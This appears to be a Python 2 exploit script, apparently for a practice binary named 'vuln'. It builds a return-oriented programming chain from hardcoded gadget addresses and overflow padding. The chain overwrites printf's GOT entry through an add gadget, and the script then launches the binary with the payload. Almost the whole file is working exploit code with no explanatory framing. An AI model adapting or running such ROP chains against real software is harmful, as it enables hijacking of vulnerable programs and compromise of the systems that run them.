#!/usr/bin/env python
import struct
from subprocess import call

'''
 G1: 0x080484ee: addl %eax, 0x5D5B04C4(%ebx) ; ret ; (1 found)
 G2: 0x08048677: popl %ebx ; pop ebp; ret ; (1 found)
 G3: 0x????????: popl %eax ; ret ; (NOT found)
 G4: 0x08048613: mov 0x34(%esp),%eax
 G5: 0x080483c8: pop ebx ; ret ; (1 found)
 G6: 0x0804862d: pop esi ; pop edi ; pop ebp ; ret ; (1 found)
 G7: 0x080484e8: movb $0x1,0x804a044
'''

g1 = 0x080484ee
g2 = 0x08048677
g4 = 0x08048613
g5 = 0x080483c8
g6 = 0x0804862d
g7 = 0x080484e8
dummy = 0xdeadbeef
esi = 0x01020101
edi = 0x01020102
ebx = 0x3fc9c18                 #ebx = 0x8049f3c - (esi*4) + 0xe0
off = 0xffff2810

#endianess convertion
def conv(num):
 return struct.pack("<I",num)

buf = "A" * 268 		#Junk
buf += conv(g7)                 #movb $0x1,0x804a044; add esp, 0x04; pop ebx; pop ebp; ret;
buf += conv(dummy)
buf += conv(dummy)
buf += conv(dummy)
buf += conv(g6)                 #pop esi; pop edi; pop ebp; ret;
buf += conv(esi)                #esi
buf += conv(edi)                #edi
buf += conv(dummy)
buf += conv(g5)                 #pop ebx; ret;
buf += conv(ebx)                #ebx
buf += conv(g4)                 #mov 0x34(%esp),%eax; ...

for num in range(0,11):
 buf += conv(dummy)

buf += conv(g2)                 #pop ebx; pop ebp; ret;
ebx = 0xaaa99b3c                #printf@GOT-0x5d5b04c4
buf += conv(ebx)
buf += conv(off)
buf += conv(g1)                 #addl %eax, 0x5D5B04C4(%ebx); ret;
buf += "B" * 4

print "Calling vulnerable program"
call(["./vuln", buf])
